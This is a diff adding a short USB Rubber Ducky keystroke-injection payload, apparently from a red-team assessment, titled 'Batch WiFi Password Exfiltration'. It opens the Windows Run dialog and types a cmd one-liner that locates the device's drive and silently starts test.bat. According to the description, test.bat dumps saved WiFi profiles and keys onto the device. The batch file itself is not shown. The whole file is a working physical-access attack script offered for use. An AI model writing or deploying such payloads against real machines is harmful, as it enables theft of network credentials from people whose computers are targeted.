@@ -1,0 +1,12 @@
+REM Title: Batch WiFi Password Exfiltration
+REM Description: Executes test.bat to dump WiFi profiles and keys directly to the DUCKY drive.
+REM Author: Red Team Assessment
+
+DELAY 500
+ATTACKMODE HID STORAGE
+DELAY 1500
+
+GUI r
+DELAY 300
+STRINGLN cmd /c "for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %i:\inject.bin start /b %i:\test.bat"
+ENTER
